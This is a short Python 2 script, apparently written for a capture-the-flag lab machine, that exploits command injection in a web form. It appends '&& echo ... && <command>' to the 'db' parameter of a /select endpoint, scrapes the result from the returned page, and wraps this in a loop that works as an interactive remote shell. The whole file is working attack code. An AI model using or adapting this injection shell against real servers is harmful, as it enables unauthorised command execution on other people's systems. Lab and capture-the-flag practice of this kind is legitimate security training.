#coding:utf-8

import sys
import requests
import urllib

from bs4 import BeautifulSoup
from optparse import *

class dns_requests:
	def __init__(self, interface="tun0", target_ip="10.10.10.127",
							post_data=None):
		'''
			I enter the parameters by default, and
			therefore to put the target and the interface
		'''
		self.target_ip = (target_ip)
		self.interface = (interface)
		self.post_data = (post_data)
		self.target_ip = ("http://%s/select" %(self.target_ip))

	def values_in_col(self, ExecutionCommand):
		'''
			The code that will be executed
			on the remote server.
		'''
		self.post_data = "&& echo '/InvokeRequests' && %s" %(ExecutionCommand)
		self.post_data = {"db":self.post_data}

		InvokeRequests = requests.post(self.target_ip, data=self.post_data).text
		InvokeRequests = BeautifulSoup(InvokeRequests, "html5lib")
		
		InvokesSearchs = InvokeRequests.find_all('pre')[0]
		InvokesSearchs = "".join(InvokesSearchs).split()[::-1]	

		RegexValueReqs = InvokesSearchs.index('/InvokeRequests')
		CountInvokeReq = len(InvokesSearchs)

		del InvokesSearchs[RegexValueReqs:CountInvokeReq]
		print " ".join(InvokesSearchs)		

	def __str__(self):
		'''
			Specifically, in this function,
			there would be code execution.
		'''
		while True:
			ExecutionCommand = raw_input('\033[42m[fortune_cmd]$> \033[0m ')
			if ExecutionCommand == ""     : print None 
			if ExecutionCommand == "quit" : sys.exit(0)

			self.values_in_col(ExecutionCommand)
	
			# So I create a loop to have information about the command.
			#Additional information on the execution of the code.

if __name__ == "__main__":
	rep = dns_requests()
	rep.__str__()
